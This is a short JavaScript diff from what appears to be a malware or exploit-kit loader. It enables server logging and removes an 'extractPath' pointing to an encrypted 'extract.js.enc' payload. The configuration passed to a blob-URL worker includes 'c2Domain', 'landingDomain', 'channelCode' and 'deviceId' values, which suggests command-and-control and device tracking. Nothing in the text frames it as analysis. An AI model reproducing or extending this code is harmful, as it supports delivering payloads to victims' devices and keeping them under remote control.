@@ -1,4 +1,4 @@
-var SERVER_LOG = false;  
+var SERVER_LOG = true;  
 let logStart = new Date().getTime();
 let logEntryID = 0;
 var offsets = {};
@@ -339,8 +339,7 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
                     channelCode: __runtimeChannelSlug(),
                     c2Domain: __runtimeDomain(),
                     landingDomain: __runtimeDomain(),
-                    deviceId: __runtimeDeviceId(),
-                    extractPath: new URL('extract.js.enc', localHost + '/').pathname
+                    deviceId: __runtimeDeviceId()
                 });
                 });
             }
@@ -371,8 +370,7 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
                         SERVER_LOG,
                         channelCode: __runtimeChannelSlug(),
                         c2Domain: __runtimeDomain(),
-                        landingDomain: __runtimeDomain(),
-                        extractPath: new URL('extract.js.enc', localHost + '/').pathname
+                        landingDomain: __runtimeDomain()
                 });
                         });
                             }
@@ -394,8 +392,7 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
                 SERVER_LOG,
                 channelCode: __runtimeChannelSlug(),
                 c2Domain: __runtimeDomain(),
-                landingDomain: __runtimeDomain(),
-                extractPath: new URL('extract.js.enc', localHost + '/').pathname
+                landingDomain: __runtimeDomain()
             });
             });
                     }
